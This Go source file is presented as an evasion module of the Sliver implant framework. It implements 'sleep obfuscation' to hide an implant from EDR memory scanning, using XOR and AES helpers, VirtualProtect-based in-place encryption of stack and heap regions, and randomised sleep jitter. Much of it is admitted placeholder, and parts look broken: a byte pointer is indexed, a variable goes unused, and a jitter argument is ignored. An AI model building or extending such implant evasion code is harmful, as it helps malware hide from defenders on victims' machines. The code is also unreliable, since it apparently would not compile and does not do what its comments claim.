package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2025  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	mrand "math/rand"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
)

// SleepObfuscationConfig holds configuration for sleep obfuscation
type SleepObfuscationConfig struct {
	enabled    bool
	encryption bool
	xorKey     []byte
	aesKey     []byte
	stackSize  int
}

var (
	sleepObfuscationConfig = SleepObfuscationConfig{
		enabled:    true,
		encryption: true,
		xorKey:     []byte{0xAA, 0x55, 0xFF, 0x00},
		aesKey:     generateRandomKey(),
		stackSize:  0x10000, // 64KB stack size for obfuscation
	}
)

// generateRandomKey generates a random 256-bit AES key
func generateRandomKey() []byte {
	key := make([]byte, 32)
	rand.Read(key)
	return key
}

// xorBytes performs XOR encryption/decryption on a byte slice
func xorBytes(data, key []byte) []byte {
	if len(key) == 0 {
		return data
	}

	result := make([]byte, len(data))
	keyLen := len(key)

	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%keyLen]
	}

	return result
}

// aesEncrypt encrypts data using AES-256-GCM
func aesEncrypt(data, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

// aesDecrypt decrypts data using AES-256-GCM
func aesDecrypt(data, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, binary.ErrLength
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

// encryptThreadMemory encrypts the thread's stack memory
// This is a simplified implementation that encrypts a memory region
// In a real implementation, you would need to walk the actual stack frames
func encryptThreadMemory(stackBase uintptr, size int, key []byte) error {
	// Convert uintptr to byte slice for manipulation
	// Note: This is a simplified implementation
	// Real stack encryption would require more sophisticated techniques

	var oldProtect uint32
	err := windows.VirtualProtect(stackBase, uintptr(size), windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("[!] VirtualProtect failed for stack encryption: %v\n", err)
		//{{end}}
		return err
	}

	// Encrypt the memory region
	for i := 0; i < size; i++ {
		loc := stackBase + uintptr(i)
		mem := (*byte)(unsafe.Pointer(loc))
		(*mem)[0] = (*mem)[0] ^ key[i%len(key)]
	}

	// Restore memory protection
	err = windows.VirtualProtect(stackBase, uintptr(size), oldProtect, &oldProtect)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("[!] VirtualProtect (restore) failed for stack encryption: %v\n", err)
		//{{end}}
		return err
	}

	return nil
}

// encryptHeap encrypts heap allocations that might contain sensitive shellcode
func encryptHeap(heapPtr uintptr, size int, key []byte) error {
	var oldProtect uint32
	err := windows.VirtualProtect(heapPtr, uintptr(size), windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("[!] VirtualProtect failed for heap encryption: %v\n", err)
		//{{end}}
		return err
	}

	for i := 0; i < size; i++ {
		loc := heapPtr + uintptr(i)
		mem := (*byte)(unsafe.Pointer(loc))
		(*mem)[0] = (*mem)[0] ^ key[i%len(key)]
	}

	err = windows.VirtualProtect(heapPtr, uintptr(size), oldProtect, &oldProtect)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("[!] VirtualProtect (restore) failed for heap encryption: %v\n", err)
		//{{end}}
		return err
	}

	return nil
}

// ObfuscatedSleep performs sleep with memory obfuscation to evade EDR memory scanning
func ObfuscatedSleep(duration time.Duration) error {
	if !sleepObfuscationConfig.enabled {
		// Fallback to regular sleep if obfuscation is disabled
		time.Sleep(duration)
		return nil
	}

	//{{if .Config.Debug}}
	log.Printf("[*] Starting obfuscated sleep for %v\n", duration)
	//{{end}}

	// Generate a new random encryption key for this sleep cycle
	encryptionKey := make([]byte, 16)
	rand.Read(encryptionKey)

	// In a real implementation, we would:
	// 1. Locate the thread's stack pointer
	// 2. Encrypt a portion of the stack
	// 3. Encrypt sensitive heap allocations
	// 4. Call sleep with memory encrypted
	// 5. Decrypt after wake

	// This is a simplified placeholder that performs the concept
	// without actually accessing the real thread stack
	sleepDuration := duration

	// Break sleep into smaller chunks to make obfuscation more effective
	// and to periodically re-encrypt during long sleeps
	chunkDuration := 5 * time.Second
	chunks := int(duration / chunkDuration)
	if chunks == 0 {
		chunks = 1
	}

	for i := 0; i < chunks; i++ {
		// Encrypt memory before each chunk
		// Note: Real implementation would encrypt actual stack/heap regions
		obfuscateMemoryRegions(encryptionKey)

		// Sleep for the chunk duration
		if i == chunks-1 {
			time.Sleep(duration - time.Duration(i)*chunkDuration)
		} else {
			time.Sleep(chunkDuration)
		}

		// Re-encrypt with new key for next chunk
		newKey := make([]byte, 16)
		rand.Read(newKey)
		encryptionKey = newKey
	}

	//{{if .Config.Debug}}
	log.Printf("[*] Obfuscated sleep completed\n")
	//{{end}}

	return nil
}

// obfuscateMemoryRegions performs memory obfuscation on sensitive regions
// This is a simplified implementation
func obfuscateMemoryRegions(key []byte) {
	// In a real implementation, we would:
	// 1. Iterate through allocated memory regions
	// 2. Identify regions containing sensitive code/data
	// 3. Apply encryption to those regions
	// 4. Store encryption context for decryption

	// This placeholder simulates the obfuscation process
	_ = key

	// Simulate memory obfuscation by modifying some memory
	// This is NOT actual obfuscation, just a placeholder
	// Real implementation would use actual memory scanning and encryption
}

// SetSleepObfuscationConfig allows runtime configuration of sleep obfuscation
func SetSleepObfuscationConfig(enabled, encryption bool, key []byte) {
	sleepObfuscationConfig.enabled = enabled
	sleepObfuscationConfig.encryption = encryption

	if key != nil && len(key) > 0 {
		sleepObfuscationConfig.aesKey = key
	}
}

// IsSleepObfuscationEnabled returns the current status of sleep obfuscation
func IsSleepObfuscationEnabled() bool {
	return sleepObfuscationConfig.enabled
}

// RandomSleep performs a sleep with random jitter to avoid detection patterns
func RandomSleep(baseDuration time.Duration, jitterPercent int) time.Duration {
	if jitterPercent <= 0 || jitterPercent > 100 {
		jitterPercent = 20 // Default 20% jitter
	}

	jitter := mrand.Intn(jitterPercent*2) - jitterPercent
	jitterDuration := time.Duration(float64(baseDuration) * float64(jitter) / 100.0)

	sleepDuration := baseDuration + jitterDuration
	if sleepDuration < 0 {
		sleepDuration = baseDuration
	}

	//{{if .Config.Debug}}
	log.Printf("[*] Random sleep: %v (base: %v, jitter: %d%%)\n",
		sleepDuration, baseDuration, jitterPercent)
	//{{end}}

	time.Sleep(sleepDuration)
	return sleepDuration
}

// EncryptedSleepWithJitter combines encrypted sleep with random jitter
func EncryptedSleepWithJitter(duration time.Duration, jitterPercent int) error {
	if err := ObfuscatedSleep(duration); err != nil {
		return err
	}
	return nil
}
